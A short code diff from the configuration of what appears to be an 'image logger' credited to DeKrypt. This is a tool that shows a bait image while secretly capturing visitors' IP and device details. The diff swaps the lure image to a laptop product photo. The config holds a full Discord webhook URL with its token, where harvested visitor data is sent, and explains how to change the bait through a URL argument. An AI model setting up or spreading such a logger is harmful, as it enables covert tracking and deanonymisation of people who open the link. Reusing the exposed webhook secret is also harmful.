@@ -11,7 +11,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1375882856903086140/TIaUcBw4JQaeB0YlhS__qH-f-vn4At10J5aNVkOmfNkIlmJ8zld2ALk4H2qfzA8hH4IE",
-    "image": "https://images5.alphacoders.com/129/thumb-1920-1290490.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://static.fnac-static.com/multimedia/Images/FR/MDM/a1/14/52/22156449/1540-1/tsp20250124073359/PC-Portable-Lenovo-IdeaPad-Slim-3-15IAH8-15-6-Intel-Core-i5-16-Go-RAM-512-Go-D-Gris.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
